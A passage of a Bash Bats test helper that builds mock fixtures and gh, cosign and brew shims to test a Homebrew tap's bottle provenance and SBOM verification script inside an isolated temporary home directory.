# Bats helper for tests/verify_provenance.bats.
#
# Target contract (artagon-shell/shell-testing/v1):
# - Language: Bash 3.2+ sourced Bats helper.
# - Role: Sourced test harness helper (`load helpers/provenance_helper`); executes
#   production targets (`scripts/verify-provenance.sh`, `scripts/update-readme-bottles.sh`,
#   `scripts/ci/*`) explicitly under both Bash 3.2 (`BATS_BASH32`) and Bash 5+ (`BATS_MODERN_BASH`).
# - State: Isolates all side effects inside `BATS_FILE_TMPDIR` and `BATS_TEST_TMPDIR`;
#   never reads or mutates live `HOME`, `~/.homebrew/trust.json`, or `~/.sigstore`.
# - Platform: macOS BSD and Linux GNU userland; requires awk, cmp, cp, curl, env,
#   find, git, grep, id, jq, mktemp, mv, readlink, rm, shasum/sha256sum, sort, uname.
# shellcheck shell=bash disable=SC2310,SC2312

readonly CERT_IDENTITY="https://github.com/artagon/homebrew-aitools/.github/workflows/sign-bottles.yml@refs/heads/main"
readonly LINEAGE_TYPE="https://github.com/artagon/homebrew-aitools/bottle-lineage/v1"
readonly ISOLATED_COMMANDS=(awk basename cat cmp cp curl dirname find grep id jq mkdir mktemp mv readlink rm sort uname)
readonly TRUSTED_ROOT_JSONL='{"mediaType":"application/vnd.dev.sigstore.trustedroot+json;version=0.1","certificateAuthorities":[{"uri":"https://fulcio.sigstore.dev"}]}
{"mediaType":"application/vnd.dev.sigstore.trustedroot+json;version=0.1","certificateAuthorities":[{"uri":"https://fulcio.githubapp.com"}]}
'

prov_sha256_file() {
  local path="$1"
  if command -v shasum >/dev/null 2>&1; then
    shasum -a 256 -- "$path" | awk '{ print $1 }'
  elif command -v sha256sum >/dev/null 2>&1; then
    sha256sum -- "$path" | awk '{ print $1 }'
  else
    openssl dgst -sha256 "$path" | awk '{ print $NF }'
  fi
}

prov_reference_parse_formula_json() {
  local rb_path="$1"
  local tag="${2:-arm64_tahoe}"
  local formula=""
  formula="$(basename "$rb_path" .rb)"

  local parsed_tsv=""
  parsed_tsv="$(
    awk -v formula="$formula" -v tag="$tag" '
      BEGIN {
        in_lc = 0; lc_ind = ""
        in_res = 0; res_ind = ""
        in_bot = 0; bot_ind = ""
        explicit_ver = ""
        rev = 0
        primary_url = ""
        root_url = ""
        rebuild = 0
        bottle_sha = ""
      }
      /^  (def (install|caveats|post_install)|test do)$/ || /^__END__$/ {
        exit
      }
      in_lc {
        if ($0 == lc_ind "end") in_lc = 0
        next
      }
      in_res {
        if ($0 == res_ind "end") in_res = 0
        next
      }
      in_bot {
        if ($0 == bot_ind "end") {
          in_bot = 0
          next
        }
        if (match($0, /^[[:space:]]*root_url "[^"]+"$/)) {
          tmp = $0
          sub(/^[[:space:]]*root_url "/, "", tmp)
          sub(/"$/, "", tmp)
          root_url = tmp
        } else if (match($0, /^[[:space:]]*rebuild [0-9]+$/)) {
          tmp = $0
          sub(/^[[:space:]]*rebuild /, "", tmp)
          rebuild = tmp + 0
        } else if (match($0, /^[[:space:]]*sha256 /) && match($0, "(^|[[:space:]])" tag ":[[:space:]]+\"[0-9a-f]{64}\"")) {
          tmp = substr($0, RSTART, RLENGTH)
          sub(/^[^"]*"/, "", tmp)
          sub(/".*$/, "", tmp)
          if (length(tmp) == 64) bottle_sha = tmp
        }
        next
      }
      match($0, /^[[:space:]]*livecheck do$/) {
        in_lc = 1
        lc_ind = $0
        sub(/livecheck do$/, "", lc_ind)
        next
      }
      match($0, /^[[:space:]]*resource "[^"]+" do$/) {
        in_res = 1
        res_ind = $0
        sub(/resource "[^"]+" do$/, "", res_ind)
        next
      }
      match($0, /^[[:space:]]*bottle do$/) {
        in_bot = 1
        bot_ind = $0
        sub(/bottle do$/, "", bot_ind)
        next
      }
      match($0, /^  version "[^"]+"$/) {
        tmp = $0
        sub(/^  version "/, "", tmp)
        sub(/"$/, "", tmp)
        explicit_ver = tmp
        next
      }
      match($0, /^  revision [0-9]+$/) {
        tmp = $0
        sub(/^  revision /, "", tmp)
        rev = tmp + 0
        next
      }
      primary_url == "" && match($0, /^[[:space:]]*url "[^"]+"$/) {
        tmp = $0
        sub(/^[[:space:]]*url "/, "", tmp)
        sub(/"$/, "", tmp)
        primary_url = tmp
        next
      }
      END {
        ver = explicit_ver
        if (ver == "") {
          raw_tag = ""
          if (match(primary_url, /releases\/download\/[^\/]+\//)) {
            raw_tag = substr(primary_url, RSTART, RLENGTH)
            sub(/^releases\/download\//, "", raw_tag)
            sub(/\/$/, "", raw_tag)
          } else if (match(primary_url, /archive\/(refs\/tags\/)?[^\/]+\.(tar\.gz|tar\.xz|tgz|zip)$/)) {
            raw_tag = substr(primary_url, RSTART, RLENGTH)
            sub(/^archive\/(refs\/tags\/)?/, "", raw_tag)
            sub(/\.(tar\.gz|tar\.xz|tgz|zip)$/, "", raw_tag)
          }
          prefix = formula "-"
          if (index(raw_tag, prefix) == 1) {
            raw_tag = substr(raw_tag, length(prefix) + 1)
          }
          if (raw_tag ~ /^[vV][0-9]/) {
            raw_tag = substr(raw_tag, 2)
          }
          ver = raw_tag
        }
        pkg_ver = (rev > 0) ? (ver "_" rev) : ver
        reb_suf = (rebuild > 0) ? ("." rebuild) : ""
        ext = "." tag ".bottle" reb_suf ".tar.gz"
        brew_fn = formula "--" pkg_ver ext
        rel_fn = formula "-" pkg_ver ext
        gsub(/@/, "%40", rel_fn)
        gsub(/\+/, "%2B", rel_fn)
        printf "%s|%s|%s|%s|%d|%s|%s|%s\n",
          ver, pkg_ver, formula "-" pkg_ver, root_url, rebuild, brew_fn, rel_fn, bottle_sha
      }
    ' "$rb_path"
  )"

  local ver="" pkg_ver="" rel_tag="" root_u="" reb="" brew_fn="" rel_fn="" b_sha=""
  IFS='|' read -r ver pkg_ver rel_tag root_u reb brew_fn rel_fn b_sha <<<"$parsed_tsv"

  jq -cn \
    --arg formula "$formula" \
    --arg version "$ver" \
    --arg pkg_version "$pkg_ver" \
    --arg release_tag "$rel_tag" \
    --arg root_url "$root_u" \
    --argjson rebuild "$reb" \
    --arg brew_filename "$brew_fn" \
    --arg release_filename "$rel_fn" \
    --arg expected_sha256 "$b_sha" \
    '{
      formula: $formula,
      version: $version,
      pkg_version: $pkg_version,
      release_tag: $release_tag,
      root_url: $root_url,
      rebuild: $rebuild,
      brew_filename: $brew_filename,
      release_filename: $release_filename,
      expected_sha256: $expected_sha256
    }'
}

prov_write_gh_shim() {
  local target="$1"
  local bash_bin="$2"
  cat >"$target" <<EOF
#!${bash_bin}
set -euo pipefail
export LC_ALL=C

jq -cn '{tool: "gh", args: \$ARGS.positional}' --args -- "\$@" >>"\${MOCK_CALL_LOG}"

case "\$#:\${1:-}:\${2:-}" in
  2:attestation:trusted-root)
    jq -r '.trusted_root_jsonl' "\${MOCK_PROVENANCE_STATE}" | awk 'NF || NR == 1 { print }'
    exit 0
    ;;
esac

[[ "\$#" -ge 3 && "\$1" = "attestation" && "\$2" = "verify" ]] || {
  printf 'unexpected gh invocation\n' >&2
  exit 1
}

artifact="\$3"
[[ -f "\${artifact}" ]] || { printf 'missing artifact\n' >&2; exit 1; }
sha="\$(shasum -a 256 -- "\${artifact}" 2>/dev/null | awk '{ print \$1 }' || sha256sum -- "\${artifact}" | awk '{ print \$1 }')"

repo_arg=""; cert_arg=""; ref_arg=""; fmt_arg=""; bundle_arg=""; tr_arg=""
pred_arg="https://slsa.dev/provenance/v1"
deny_self_hosted=0
shift 3
while [[ "\$#" -gt 0 ]]; do
  case "\$1" in
    --repo) repo_arg="\$2"; shift 2 ;;
    --cert-identity) cert_arg="\$2"; shift 2 ;;
    --source-ref) ref_arg="\$2"; shift 2 ;;
    --format) fmt_arg="\$2"; shift 2 ;;
    --bundle) bundle_arg="\$2"; shift 2 ;;
    --custom-trusted-root) tr_arg="\$2"; shift 2 ;;
    --predicate-type) pred_arg="\$2"; shift 2 ;;
    --deny-self-hosted-runners) deny_self_hosted=1; shift ;;
    *) shift ;;
  esac
done

[[ "\${repo_arg}" = "artagon/homebrew-aitools" && "\${ref_arg}" = "refs/heads/main" && "\${fmt_arg}" = "json" && "\${deny_self_hosted}" -eq 1 ]] || {
  printf 'bad gh flags\n' >&2
  exit 1
}
[[ -z "\${bundle_arg}" || -f "\${bundle_arg}" ]] || { printf 'missing --bundle file\n' >&2; exit 1; }
[[ -z "\${tr_arg}" || -f "\${tr_arg}" ]] || { printf 'missing --custom-trusted-root file\n' >&2; exit 1; }

jq -c \
  --arg sha "\${sha}" \
  --arg pred "\${pred_arg}" \
  --arg cert "\${cert_arg}" \
  --arg bfile "\${bundle_arg}" \
  --arg trfile "\${tr_arg}" \
  '
  (if .expected_cert_identity != \$cert then error("bad --cert-identity") else . end)
  | (if (.expect_bundle == true and (\$bfile == "")) then error("missing --bundle") else . end)
  | (if (.expect_custom_trusted_root == true and (\$trfile == "")) then error("missing --custom-trusted-root") else . end)
  | (if .by_sha[\$sha] == null then error("no attestation") else . end)
  | .by_sha[\$sha] as \$entry
  | (.override_san // .expected_cert_identity) as \$san
  | (.subject_mode // "dual") as \$mode
  | (if \$pred == "https://slsa.dev/provenance/v1" then
      (if \$mode == "missing_double_dash" then
        [{
          verificationResult: {
            signature: {certificate: {subjectAlternativeName: \$san}},
            statement: {
              predicateType: \$pred,
              subject: [{name: \$entry.release_filename, digest: {sha256: \$sha}}]
            }
          }
        }]
      else (if \$mode == "split_subjects" then
        [
          {
            verificationResult: {
              signature: {certificate: {subjectAlternativeName: \$san}},
              statement: {
                predicateType: \$pred,
                subject: [{name: \$entry.brew_filename, digest: {sha256: \$sha}}]
              }
            }
          },
          {
            verificationResult: {
              signature: {certificate: {subjectAlternativeName: \$san}},
              statement: {
                predicateType: \$pred,
                subject: [{name: \$entry.release_filename, digest: {sha256: \$sha}}]
              }
            }
          }
        ]
      else
        [{
          verificationResult: {
            signature: {certificate: {subjectAlternativeName: \$san}},
            statement: {
              predicateType: \$pred,
              subject: [
                {name: \$entry.brew_filename, digest: {sha256: \$sha}},
                {name: \$entry.release_filename, digest: {sha256: \$sha}}
              ]
            }
          }
        }]
      end) end)
    else (if \$pred == .lineage_type then
      [{
        verificationResult: {
          signature: {certificate: {subjectAlternativeName: \$san}},
          statement: {
            predicateType: \$pred,
            subject: [
              {name: \$entry.brew_filename, digest: {sha256: \$sha}},
              {name: \$entry.release_filename, digest: {sha256: \$sha}}
            ],
            predicate: {bottles: [\$entry]}
          }
        }
      }]
    else
      error("unexpected predicate")
    end) end)
' "\${MOCK_PROVENANCE_STATE}"
EOF
  chmod 0755 "$target"
}

prov_write_cosign_shim() {
  local target="$1"
  local bash_bin="$2"
  cat >"$target" <<EOF
#!${bash_bin}
set -euo pipefail
export LC_ALL=C

tuf_root="\${TUF_ROOT:-}"
jq -cn --arg tuf "\${tuf_root}" '{tool: "cosign", args: \$ARGS.positional, tuf_root: \$tuf}' --args -- "\$@" >>"\${MOCK_CALL_LOG}"

[[ -n "\${tuf_root}" && "\${tuf_root}" != "\${HOME}"* ]] || {
  printf 'unsafe TUF_ROOT: %s\n' "\${tuf_root}" >&2
  exit 1
}

subcmd="\${1:-}"
shift || true
cert_id=""; oidc_iss=""; bpath=""; tr=""; att_type=""; digest=""; digest_alg=""
while [[ "\$#" -gt 0 ]]; do
  case "\$1" in
    --offline) printf 'deprecated --offline passed to cosign v3\n' >&2; exit 1 ;;
    --certificate-identity) cert_id="\$2"; shift 2 ;;
    --certificate-oidc-issuer) oidc_iss="\$2"; shift 2 ;;
    --bundle) bpath="\$2"; shift 2 ;;
    --trusted-root) tr="\$2"; shift 2 ;;
    --type) att_type="\$2"; shift 2 ;;
    --digest) digest="\$2"; shift 2 ;;
    --digestAlg) digest_alg="\$2"; shift 2 ;;
    *) shift ;;
  esac
done

expected_id="\$(jq -r '.expected_cert_identity' "\${MOCK_PROVENANCE_STATE}")"
[[ "\${cert_id}" = "\${expected_id}" ]] || exit 1
[[ "\${oidc_iss}" = "https://token.actions.githubusercontent.com" ]] || exit 1
[[ -n "\${bpath}" && -f "\${bpath}" ]] || { printf 'missing cosign --bundle\n' >&2; exit 1; }

! jq -e '.expect_cosign_trusted_root == true' "\${MOCK_PROVENANCE_STATE}" >/dev/null 2>&1 || {
  [[ -n "\${tr}" && -f "\${tr}" ]] || { printf 'missing cosign --trusted-root\n' >&2; exit 1; }
  jq -e '.mediaType == "application/vnd.dev.sigstore.trustedroot+json;version=0.1"' "\${tr}" >/dev/null
  grep -Fq "sigstore.dev" "\${tr}"
}

case "\${subcmd}" in
  verify-blob)
    printf 'Verified OK\n'
    exit 0
    ;;
  verify-blob-attestation)
    [[ "\${att_type}" = "spdxjson" ]] || exit 1
    [[ "\${digest}" =~ ^[0-9a-f]{64}\$ && "\${digest_alg}" = "sha256" ]] || exit 1
    printf 'Verified OK\n'
    exit 0
    ;;
  *)
    printf 'unexpected cosign args\n' >&2
    exit 1
    ;;
esac
EOF
  chmod 0755 "$target"
}

prov_write_brew_shim() {
  local target="$1"
  local bash_bin="$2"
  cat >"$target" <<EOF
#!${bash_bin}
set -euo pipefail
export LC_ALL=C

args_json="\$(jq -cn '\$ARGS.positional' --args -- "\$@")"
jq -cn \
  --argjson args "\${args_json}" \
  --arg u "\${USER:-}" \
  --arg xdg "\${XDG_CONFIG_HOME:-}" \
  --arg hcfg "\${HOMEBREW_USER_CONFIG_HOME:-}" \
  --arg ghcfg "\${GH_CONFIG_DIR:-}" \
  --arg ghst "\${GH_STATE_DIR:-}" \
  --arg hcache "\${HOMEBREW_CACHE:-}" \
  '{tool: "brew", args: \$args, env: {USER: \$u, XDG_CONFIG_HOME: \$xdg, HOMEBREW_USER_CONFIG_HOME: \$hcfg, GH_CONFIG_DIR: \$ghcfg, GH_STATE_DIR: \$ghst, HOMEBREW_CACHE: \$hcache}}' \
  >>"\${MOCK_CALL_LOG}"

case "\$#:\${1:-}:\${2:-}:\${3:-}" in
  2:--repository:artagon/aitools:)
    tap_repo="\$(jq -r '.mock_tap_repo // empty' "\${MOCK_PROVENANCE_STATE}")"
    [[ -n "\${tap_repo}" ]] || exit 1
    printf '%s\n' "\${tap_repo}"
    exit 0
    ;;
esac

[[ -n "\${USER:-}" ]] || { printf 'USER must be populated\n' >&2; exit 1; }
[[ -n "\${XDG_CONFIG_HOME:-}" && "\${XDG_CONFIG_HOME}" != "\${HOME}"* ]] ||
  { printf 'XDG_CONFIG_HOME leaked into HOME\n' >&2; exit 1; }
[[ -n "\${HOMEBREW_USER_CONFIG_HOME:-}" && "\${HOMEBREW_USER_CONFIG_HOME}" != "\${HOME}"* ]] ||
  { printf 'HOMEBREW_USER_CONFIG_HOME leaked into HOME\n' >&2; exit 1; }
[[ -n "\${GH_STATE_DIR:-}" && "\${GH_STATE_DIR}" != "\${HOME}"* ]] ||
  { printf 'GH_STATE_DIR leaked into HOME\n' >&2; exit 1; }

expected_gh_cfg="\$(jq -r '.expect_gh_config_dir // empty' "\${MOCK_PROVENANCE_STATE}")"
[[ -z "\${expected_gh_cfg}" || "\${GH_CONFIG_DIR:-}" = "\${expected_gh_cfg}" ]] ||
  { printf 'GH_CONFIG_DIR not preserved\n' >&2; exit 1; }

trust_marker="\${HOMEBREW_USER_CONFIG_HOME}/trust.json"
case "\${1:-}" in
  trust)
    [[ "\$#" -eq 3 && "\$2" = "--tap" && "\$3" = "artagon/aitools" ]] || exit 1
    mkdir -p "\$(dirname "\${trust_marker}")"
    printf '{"trusted":["artagon/aitools"]}\n' >"\${trust_marker}"
    exit 0
    ;;
  verify)
    [[ -f "\${trust_marker}" ]] || { printf 'brew verify called before brew trust\n' >&2; exit 1; }
    has_quiet=0; has_tag=0; has_force=0; has_json=0
    for a in "\$@"; do
      [[ "\${a}" = "--quiet" ]] && has_quiet=1
      [[ "\${a}" =~ ^--bottle-tag=[a-z0-9_]+$ ]] && has_tag=1
      [[ "\${a}" = "--force" ]] && has_force=1
      [[ "\${a}" = "--json" ]] && has_json=1
    done
    [[ "\${has_quiet}" -eq 1 && "\${has_tag}" -eq 1 && "\${has_force}" -eq 1 && "\${has_json}" -eq 1 ]] ||
      { printf 'missing expected brew verify flags\n' >&2; exit 1; }
    jq -c '.brew_verify_response // [{"verified": true}]' "\${MOCK_PROVENANCE_STATE}"
    rc="\$(jq -r '.brew_verify_rc // 0' "\${MOCK_PROVENANCE_STATE}")"
    exit "\${rc}"
    ;;
  *)
    printf 'unexpected brew args\n' >&2
    exit 1
    ;;
esac
EOF
  chmod 0755 "$target"
}

prov_make_spdx_json() {
  local name="$1"
  local ver="$2"
  local extra_pkg="${3:-core-bin}"
  jq -cn \
    --arg name "$name" \
    --arg ver "$ver" \
    --arg extra "$extra_pkg" \
    '{
      spdxVersion: "SPDX-2.3",
      dataLicense: "CC0-1.0",
      SPDXID: "SPDXRef-DOCUMENT",
      name: $name,
      documentNamespace: ("https://anchore.com/syft/file/" + $name),
      packages: [
        {name: $name, SPDXID: "SPDXRef-Root", versionInfo: $ver},
        {name: $extra, SPDXID: "SPDXRef-Pkg-1", versionInfo: $ver}
      ]
    }'
}

prov_make_cdx_json() {
  local name="$1"
  local ver="$2"
  jq -cn \
    --arg name "$name" \
    --arg ver "$ver" \
    '{
      bomFormat: "CycloneDX",
      specVersion: "1.6",
      version: 1,
      metadata: {component: {name: $name, version: $ver}},
      components: [{type: "library", name: "dep-a", version: "1.0.0"}]
    }'
}

prov_make_spdx_sigstore_bundle() {
  local spdx_file="$1"
  jq -cn --slurpfile spdx "$spdx_file" '
    {
      _type: "https://in-toto.io/Statement/v1",
      predicateType: "https://spdx.dev/Document",
      predicate: $spdx[0]
    } as $stmt
    | {
        mediaType: "application/vnd.dev.sigstore.bundle.v0.3+json",
        dsseEnvelope: {
          payloadType: "application/vnd.in-toto+json",
          payload: ($stmt | tojson | @base64),
          signatures: [{sig: "dGVzdA=="}]
        }
      }
  '
}

prov_build_fixture_repo() {
  local root_dir="$1"
  shift
  local repo_dir="$root_dir/repo"
  local formula_dir="$repo_dir/Formula"
  local releases_dir="$root_dir/releases"
  mkdir -p "$formula_dir" "$releases_dir"

  local -a rb_files=()
  if [[ "$#" -gt 0 ]]; then
    local fn=""
    for fn in "$@"; do
      rb_files+=("$PROV_REPO_ROOT/Formula/$fn.rb")
    done
  else
    local cand=""
    for cand in "$PROV_REPO_ROOT/Formula"/*.rb; do
      if grep -Eq '^[[:space:]]*bottle do$' "$cand"; then
        rb_files+=("$cand")
      fi
    done
  fi

  local entries_jsonl="$root_dir/.entries.jsonl"
  : >"$entries_jsonl"

  local src_rb=""
  for src_rb in "${rb_files[@]}"; do
    local ref_json=""
    ref_json="$(prov_reference_parse_formula_json "$src_rb")"
    local formula="" pkg_ver="" rel_tag="" brew_fn="" rel_fn=""
    IFS='|' read -r formula pkg_ver rel_tag brew_fn rel_fn < <(
      printf '%s\n' "$ref_json" \
        | jq -r '[.formula, .pkg_version, .release_tag, .brew_filename, .release_filename] | join("|")'
    )

    local rel_dir="$releases_dir/$rel_tag"
    mkdir -p "$rel_dir"

    local bottle_file="$rel_dir/$rel_fn"
    printf 'mock-bottle:%s:%s\n' "$formula" "$pkg_ver" >"$bottle_file"
    local bottle_sha=""
    bottle_sha="$(prov_sha256_file "$bottle_file")"
    printf '%s  %s\n' "$bottle_sha" "$rel_fn" >"$rel_dir/$rel_fn.sha256"

    local spdx_path="$rel_dir/$rel_fn.spdx.json"
    local cdx_path="$rel_dir/$rel_fn.cdx.json"
    prov_make_spdx_json "$formula" "$pkg_ver" >"$spdx_path"
    prov_make_cdx_json "$formula" "$pkg_ver" >"$cdx_path"

    jq -cn --arg sha "$bottle_sha" '{bundle: "slsa", sha256: $sha}' >"$rel_dir/$rel_fn.intoto.jsonl"
    jq -cn --arg sha "$bottle_sha" '{bundle: "lineage", sha256: $sha}' >"$rel_dir/$rel_fn.lineage.intoto.jsonl"
    printf '{"mediaType":"application/vnd.dev.sigstore.bundle.v0.3+json"}\n' >"$rel_dir/$rel_fn.sigstore.json"
    prov_make_spdx_sigstore_bundle "$spdx_path" >"$rel_dir/$rel_fn.spdx.sigstore.json"

    local spdx_sha="" cdx_sha=""
    spdx_sha="$(prov_sha256_file "$spdx_path")"
    cdx_sha="$(prov_sha256_file "$cdx_path")"

    awk -v file_url="file://$rel_dir" -v bsha="$bottle_sha" '
      !done_root && match($0, /^[[:space:]]*root_url "[^"]+"$/) {
        sub(/"[^"]+"$/, "\"" file_url "\"")
        done_root = 1
        print
        next
      }
      !done_sha && match($0, /arm64_tahoe:[[:space:]]*"[0-9a-f]{64}"/) {
        sub(/arm64_tahoe:[[:space:]]*"[0-9a-f]{64}"/, "arm64_tahoe: \"" bsha "\"")
        done_sha = 1
        print
        next
      }
      { print }
    ' "$src_rb" >"$formula_dir/$(basename "$src_rb")"

    jq -cn \
      --arg formula "$formula" \
      --arg pkg_version "$pkg_ver" \
      --arg release_tag "$rel_tag" \
      --arg brew_filename "$brew_fn" \
      --arg release_filename "$rel_fn" \
      --arg bottle_sha256 "$bottle_sha" \
      --arg spdx_sha256 "$spdx_sha" \
      --arg cdx_sha256 "$cdx_sha" \
      '{
        formula: $formula,
        pkg_version: $pkg_version,
        release_tag: $release_tag,
        brew_filename: $brew_filename,
        release_filename: $release_filename,
        bottle_sha256: $bottle_sha256,
        spdx_sha256: $spdx_sha256,
        cdx_sha256: $cdx_sha256
      }' >>"$entries_jsonl"
  done

  jq -s \
    --arg cert "$CERT_IDENTITY" \
    --arg ltype "$LINEAGE_TYPE" \
    --arg tr "$TRUSTED_ROOT_JSONL" \
    '{
      expected_cert_identity: $cert,
      lineage_type: $ltype,
      trusted_root_jsonl: $tr,
      by_sha: (map({key: .bottle_sha256, value: .}) | from_entries)
    }' "$entries_jsonl" >"$root_dir/fixture-state.json"
  rm -f -- "$entries_jsonl"
}

prov_snapshot_tree() {
  local dir="$1"
  local out_manifest="$2"
  local ignore_library="${3:-0}"
  : >"$out_manifest"
  local p=""
  local rel=""
  while IFS= read -r p; do
    [[ -z "$p" ]] && continue
    rel="${p#"$dir/"}"
    if [[ "$ignore_library" -eq 1 ]] && [[ "$rel" = "Library" || "$rel" == Library/* ]]; then
      continue
    fi
    if [[ -L "$p" ]]; then
      printf 'L\t%s\t%s\n' "$rel" "$(readlink "$p")" >>"$out_manifest"
    elif [[ -f "$p" ]]; then
      printf 'F\t%s\t%s\n' "$rel" "$(prov_sha256_file "$p")" >>"$out_manifest"
    elif [[ -d "$p" ]]; then
      printf 'D\t%s\n' "$rel" >>"$out_manifest"
    fi
  done < <(find "$dir" -mindepth 1 -print | LC_ALL=C sort)
}

prov_setup_file_shared() {
  export PROV_BASH32="${BATS_BASH32:-/bin/bash}"
  export PROV_MODERN_BASH="${BATS_MODERN_BASH:-$(command -v bash)}"
  export PROV_REPO_ROOT="${BATS_REPO_ROOT:-$(cd "$BATS_TEST_DIRNAME/.." && pwd -P)}"
  export PROV_HAS_BASH32=0

  [[ -x "$PROV_MODERN_BASH" ]] || {
    printf 'Missing Bash 5+ interpreter: %s\n' "$PROV_MODERN_BASH" >&2
    return 1
  }

  local mod_ver=""
  mod_ver="$("$PROV_MODERN_BASH" --version | awk 'NR == 1 { print; exit }')"
  [[ "$mod_ver" =~ version\ [5-9]\. ]] || {
    printf 'BATS_MODERN_BASH must identify Bash 5+ (got: %s)\n' "$mod_ver" >&2
    return 1
  }

  local b32_ver=""
  if [[ -x "$PROV_BASH32" ]]; then
    b32_ver="$("$PROV_BASH32" --version | awk 'NR == 1 { print; exit }')"
  fi
  if [[ "$b32_ver" =~ version\ 3\.2\. ]]; then
    PROV_HAS_BASH32=1
  elif [[ "$(uname -s)" = "Darwin" ]]; then
    printf 'BATS_BASH32 must identify Bash 3.2 on Darwin (got: %s)\n' "${b32_ver:-missing}" >&2
    return 1
  fi

  local shim_bash="$PROV_MODERN_BASH"
  if [[ "$PROV_HAS_BASH32" -eq 1 ]]; then
    shim_bash="$PROV_BASH32"
  fi

  export PROV_ENV_BIN PROV_GIT_BIN
  PROV_ENV_BIN="$(command -v env)"
  PROV_GIT_BIN="$(command -v git)"

  export PROV_SHARED_ROOT="$BATS_FILE_TMPDIR/prov-shared"
  mkdir -p "$PROV_SHARED_ROOT/cmd-bin" "$PROV_SHARED_ROOT/shims"

  export PROV_VERIFIER_SNAPSHOT="$PROV_SHARED_ROOT/verify-provenance.sh"
  cp "$PROV_REPO_ROOT/scripts/verify-provenance.sh" "$PROV_VERIFIER_SNAPSHOT"
  chmod 0755 "$PROV_VERIFIER_SNAPSHOT"

  local cmd_name="" resolved=""
  for cmd_name in "${ISOLATED_COMMANDS[@]}"; do
    resolved="$(command -v "$cmd_name")"
    ln -s "$resolved" "$PROV_SHARED_ROOT/cmd-bin/$cmd_name"
  done
  local sha_bin=""
  sha_bin="$(command -v shasum || command -v sha256sum)"
  ln -s "$sha_bin" "$PROV_SHARED_ROOT/cmd-bin/$(basename "$sha_bin")"

  prov_write_gh_shim "$PROV_SHARED_ROOT/shims/gh" "$shim_bash"
  prov_write_cosign_shim "$PROV_SHARED_ROOT/shims/cosign" "$shim_bash"
  prov_write_brew_shim "$PROV_SHARED_ROOT/shims/brew" "$shim_bash"

  export PROV_ALL_FIXTURES="$PROV_SHARED_ROOT/all-fixtures"
  prov_build_fixture_repo "$PROV_ALL_FIXTURES"
}

prov_setup_case_root() {
  local shell_bin="$1"
  local with_cosign="${2:-1}"
  local with_brew="${3:-0}"

  local root="$BATS_TEST_TMPDIR/case"
  rm -rf -- "$root"
  mkdir -p "$root/home" "$root/bin" "$root/tmp"
  local link=""
  for link in "$PROV_SHARED_ROOT/cmd-bin"/*; do
    ln -s "$(readlink "$link")" "$root/bin/$(basename "$link")"
  done
  ln -s "$shell_bin" "$root/bin/bash"
  ln -s "$PROV_SHARED_ROOT/shims/gh" "$root/bin/gh"
  if [[ "$with_cosign" -eq 1 ]]; then
    ln -s "$PROV_SHARED_ROOT/shims/cosign" "$root/bin/cosign"
  fi
  if [[ "$with_brew" -eq 1 ]]; then
    ln -s "$PROV_SHARED_ROOT/shims/brew" "$root/bin/brew"
  fi
  : >"$root/call-log.jsonl"
  printf '%s\n' "$root"
}

prov_run_verifier() {
  local root="$1"
  local shell_bin="$2"
  local repo_override="$3"
  shift 3

  PROV_RC=0
  PROV_OUT="$root/verifier.out"
  PROV_ERR="$root/verifier.err"

  local -a env_vars=(
    "HOME=$root/home"
    "PATH=$root/bin"
    "LC_ALL=C"
    "TMPDIR=$root/tmp"
    "MOCK_PROVENANCE_STATE=$root/mock-state.json"
    "MOCK_CALL_LOG=$root/call-log.jsonl"
  )
  if [[ -n "$repo_override" ]]; then
    env_vars+=("PROVENANCE_REPO_ROOT=$repo_override")
  fi

  (
    cd "$root/home" \
      && "$PROV_ENV_BIN" -i "${env_vars[@]}" "$shell_bin" "$PROV_VERIFIER_SNAPSHOT" "$@"
  ) >"$PROV_OUT" 2>"$PROV_ERR" || PROV_RC=$?
}

case_parse_all_live_formulae() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin")"

  local norm_repo="$root/live-normalized"
  mkdir -p "$norm_repo/Formula"
  local expected_jsonl="$root/expected-live.jsonl"
  : >"$expected_jsonl"

  local live_count=0
  local rb=""
  for rb in "$PROV_REPO_ROOT/Formula"/*.rb; do
    grep -Eq '^[[:space:]]*bottle do$' "$rb" || continue
    live_count=$((live_count + 1))
    local pre_ref="" rel_tag="" expected_root="" dst=""
    pre_ref="$(prov_reference_parse_formula_json "$rb")"
    rel_tag="$(printf '%s\n' "$pre_ref" | jq -r '.release_tag')"
    expected_root="https://github.com/artagon/homebrew-aitools/releases/download/$rel_tag"
    dst="$norm_repo/Formula/$(basename "$rb")"
    awk -v eroot="$expected_root" '
      !done_root && match($0, /^[[:space:]]*root_url "[^"]+"$/) {
        sub(/"[^"]+"$/, "\"" eroot "\"")
        done_root = 1
      }
      { print }
    ' "$rb" >"$dst"
    prov_reference_parse_formula_json "$dst" >>"$expected_jsonl"
  done

  [[ "$live_count" -ge 17 ]]
  prov_snapshot_tree "$root/home" "$root/before.tree" 1
  prov_run_verifier "$root" "$shell_bin" "$norm_repo" --parse-only --json
  [[ "$PROV_RC" -eq 0 && ! -s "$PROV_ERR" ]]

  jq -e \
    --argjson expected_count "$live_count" \
    --slurpfile expected "$expected_jsonl" \
    '
      .ok == true
      and .checked == $expected_count
      and .passed == $expected_count
      and .failed == 0
      and (
        (.results | map({key: .formula, value: .}) | from_entries) as $got
        | $expected
        | all(
            .formula as $f
            | $got[$f].version == .version
            and $got[$f].pkg_version == .pkg_version
            and $got[$f].release_tag == .release_tag
            and $got[$f].root_url == .root_url
            and $got[$f].rebuild == .rebuild
            and $got[$f].brew_filename == .brew_filename
            and $got[$f].release_filename == .release_filename
            and $got[$f].expected_sha256 == .expected_sha256
          )
      )
    ' "$PROV_OUT" >/dev/null

  prov_snapshot_tree "$root/home" "$root/after.tree" 1
  cmp -s "$root/before.tree" "$root/after.tree"
}

case_full_verify_all_fixtures() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin")"
  cp "$PROV_ALL_FIXTURES/fixture-state.json" "$root/mock-state.json"
  local expected_count=""
  expected_count="$(jq '.by_sha | length' "$root/mock-state.json")"
  [[ "$expected_count" -ge 17 ]]

  prov_snapshot_tree "$root/home" "$root/before.tree" 1
  prov_run_verifier "$root" "$shell_bin" "$PROV_ALL_FIXTURES/repo" \
    --all --allow-file-root-url --require-cosign --json
  [[ "$PROV_RC" -eq 0 && ! -s "$PROV_ERR" ]]

  jq -e --argjson cnt "$expected_count" '
    .ok == true and .passed == $cnt and .failed == 0
    and (.results | all(
      .spdx_packages == 2
      and .cyclonedx_components == 1
      and .checks.formula_metadata == "passed"
      and .checks.bottle_sha256 == "passed"
      and .checks.sha256_sidecar == "passed"
